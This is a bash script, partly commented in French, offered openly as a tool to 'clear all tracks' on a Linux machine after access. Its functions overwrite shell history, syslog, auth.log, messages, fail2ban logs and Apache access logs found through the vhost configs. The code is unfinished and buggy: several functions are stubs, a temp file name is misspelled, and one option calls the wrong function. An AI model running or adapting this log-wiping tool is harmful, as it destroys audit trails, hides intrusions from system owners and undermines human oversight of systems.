#!/bin/bash

#.  Description : Script to clear all tracks on a Linux Machine
#.  mode bourrin -b qui clear tout et -s "subtil way"

usage() {

  script_name=$(basename $0)
  echo -e "This is the list of available options: "
  echo -e "\t  -b : The brutal way of clearing logs."
  echo -e "\t  -s : The subtil way of clearing logs."
}

brutal_way() {
echo "Clearing all logs..."
history -cw
echo " " > /root/.*history
echo " " > /home/*/.*history
echo " " > /var/log/syslog
echo " " > /var/log/auth.log
echo " " > /var/log/user.log
echo " " > /var/log/messages

if [ -f /var/log/fail2ban.log ]
then
  echo " " > /var/log/fail2ban.log
fi

}

subtil_way() {
echo "subtil way"
}

clear_http() {
##Essayer d'effacer les logs HTTP en fonction d'où provient la co

web_server=$(lsof -i | grep LISTEN | grep http | head -n 1 | awk '{print $1}')
case ${web_server} in
  apache2)
    apache2_RHEL_dir="/etc/httpd/"
    apache2_DEB_dir="/etc/apache2/"
    if [ -d ${apache2_RHEL_dir} ];then
      grep access.log ${apache2_RHEL_dir}/conf.d/* > /tmp/vhost_logs.txt
      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
      ##Mode bourrin : ON
      cat /tmp/vhost_logs2.txt | while read line
        do
          echo "${line}"
        done
    
     elif [ -d ${apache2_DEB_dir} ];then
      grep access.log ${apache2_DEB_dir}/sites-enabled/* > /tmp/vhost_logs.txt
      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
      ##Mode bourrin : ON
      cat /tmp/vhost_logs2.txt | while read line
        do
          echo " " > "${line}"
        done
  
    fi
    ;;
  nginx)
    nginx_dir="/etc/nginx/"
    ;;
  *)
   echo "Unknown web server"
   ;;
esac
}

clear_ftp() {
echo " test"
}

if [ -z ${1} ]
then
  usage
fi

while getopts "bs" opt; do
  case $opt in
    b) #brutal_way
      clear_http
      ;;
    s) subtil_way
      ;;
  esac
done

exit 0
